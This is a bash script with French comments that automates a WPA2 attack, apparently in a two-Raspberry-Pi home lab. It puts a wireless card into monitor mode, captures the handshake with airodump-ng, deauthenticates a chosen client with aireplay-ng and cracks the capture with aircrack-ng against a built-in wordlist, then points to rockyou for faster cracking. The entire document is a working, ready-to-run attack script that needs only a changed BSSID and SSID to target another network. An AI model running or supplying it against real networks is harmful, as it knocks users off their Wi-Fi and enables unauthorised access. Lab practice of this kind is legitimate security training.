#!/bin/bash
# ===========================================
# ATTAQUE WPA2 — Pi A (kali-raspberrypi-A)
# Prérequis : wlan1 (ALFA RTL8192EU) en mode moniteur
# Cible : Pi B en mode WPA2 (./switch.sh wpa2)
# Méthode : Deauth → Capture handshake → Crack dico
# ===========================================

IFACE=wlan1
TARGET_BSSID="B8:27:EB:3D:2F:FA"   # MAC Pi B wlan0 — adapter si besoin
TARGET_SSID="Lab-WPA2-Network"
CHANNEL=6
CAPTURE_DIR="/tmp/wpa2_lab"
WORDLIST="/tmp/wordlist.txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

mkdir -p $CAPTURE_DIR

# Créer wordlist minimale si absente
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[*] Création wordlist...${NC}"
    cat > $WORDLIST << 'WORDLIST_EOF'
123456
password
password123
admin
12345678
azerty
motdepasse
qwerty
letmein
wifi123
WORDLIST_EOF
fi

echo -e "${CYAN}[*] === ATTAQUE WPA2 — Deauth + Handshake ===${NC}"
echo ""

# ÉTAPE 1 : Vérifier mode moniteur
echo -e "${YELLOW}[1] Vérification mode moniteur...${NC}"
sudo pkill wpa_supplicant 2>/dev/null
sudo airmon-ng check kill 2>/dev/null
sudo airmon-ng start $IFACE 2>/dev/null
sleep 1
iwconfig $IFACE | grep -q "Mode:Monitor" && \
    echo -e "${GREEN}[+] Mode moniteur OK${NC}" || \
    echo -e "${RED}[-] Vérifier l'interface${NC}"

# ÉTAPE 2 : Capture ciblée
echo -e "${YELLOW}[2] Démarrage capture — attente client...${NC}"
echo -e "${YELLOW}    Connecte ton téléphone à $TARGET_SSID${NC}"
rm -f $CAPTURE_DIR/wpa2_capture*.cap
sudo airodump-ng -c $CHANNEL --bssid $TARGET_BSSID \
    -w $CAPTURE_DIR/wpa2_capture $IFACE &
AIRODUMP_PID=$!
sleep 5

# ÉTAPE 3 : Attendre client puis deauth
echo -e "${YELLOW}[3] Cherche un client connecté...${NC}"
sleep 3

read -p "Entre la MAC du client connecté (visible dans airodump) : " CLIENT_MAC
echo -e "${YELLOW}[4] Envoi deauth → capture handshake...${NC}"
sudo aireplay-ng --deauth 5 \
    -a $TARGET_BSSID \
    -c $CLIENT_MAC \
    $IFACE

echo ""
echo -e "${GREEN}[*] Vérifier le handshake dans airodump (coin haut droit)${NC}"
echo -e "${GREEN}    WPA handshake: $TARGET_BSSID${NC}"
echo ""
sleep 3

# ÉTAPE 4 : Crack
kill $AIRODUMP_PID 2>/dev/null
echo -e "${YELLOW}[5] Crack par dictionnaire...${NC}"
sudo aircrack-ng -w $WORDLIST $CAPTURE_DIR/wpa2_capture-01.cap

echo ""
echo -e "${CYAN}[*] Pour un crack plus rapide avec rockyou :${NC}"
echo -e "${CYAN}    sudo gunzip /usr/share/wordlists/rockyou.txt.gz${NC}"
echo -e "${CYAN}    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt $CAPTURE_DIR/wpa2_capture-01.cap${NC}"
